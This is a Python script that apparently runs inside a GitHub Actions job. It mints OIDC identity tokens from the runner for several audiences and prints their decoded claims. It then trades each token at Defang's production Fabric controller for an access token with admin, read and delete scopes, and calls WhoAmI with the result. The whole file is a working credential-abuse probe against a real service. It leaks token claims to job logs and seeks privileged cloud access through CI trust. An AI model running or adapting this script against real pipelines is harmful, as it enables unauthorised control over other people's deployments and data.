import os, json, base64, urllib.request, urllib.parse, urllib.error
FABRIC="https://fabric-prod1.defang.dev/io.defang.v1.FabricController"
def get_token(aud=None):
    url=os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]
    if aud: url+="&audience="+urllib.parse.quote(aud,safe="")
    req=urllib.request.Request(url,headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
    try:
        with urllib.request.urlopen(req,timeout=30) as r: return 200,json.load(r)["value"]
    except urllib.error.HTTPError as e: return e.code,e.read().decode()[:300]
def call(m,b,t=None):
    req=urllib.request.Request(FABRIC+"/"+m,data=json.dumps(b).encode(),headers={"Content-Type":"application/json","Connect-Protocol-Version":"1"})
    if t: req.add_header("Authorization","Bearer "+t)
    try:
        with urllib.request.urlopen(req,timeout=30) as r: return r.status,r.read().decode()
    except urllib.error.HTTPError as e: return e.code,e.read().decode()
    except Exception as e: return -1,repr(e)
def claims(t):
    p=t.split(".")[1]; p+="="*(-len(p)%4)
    c=json.loads(base64.urlsafe_b64decode(p))
    return {k:c.get(k) for k in ["iss","sub","aud","ref","environment","repository","repository_owner","repository_owner_id","job_workflow_ref","event_name","workflow","actor"]}
print("GITHUB_EVENT_NAME",os.environ.get("GITHUB_EVENT_NAME"),"REPO",os.environ.get("GITHUB_REPOSITORY"))
for aud in [None,"sts.amazonaws.com","https://defang.io","https://github.com/DefangLabs"]:
    st,t=get_token(aud)
    print("AUD %r -> %s"%(aud,st), "" if st!=200 else "", flush=True)
    if st!=200: print("  body",t,flush=True); continue
    print("  claims",json.dumps(claims(t)),flush=True)
    st2,resp=call("Token",{"assertion":t,"scope":["admin","read","delete","tail"]})
    print("  fabric-http",st2,resp[:400],flush=True)
    try: at=json.loads(resp).get("accessToken")
    except Exception: at=None
    if at:
        p=at.split(".")[1]; p+="="*(-len(p)%4)
        print("  fabric-claims",json.dumps(json.loads(base64.urlsafe_b64decode(p))),flush=True)
        print("  WhoAmI",call("WhoAmI",{},at),flush=True)
        break
print("DONE3")
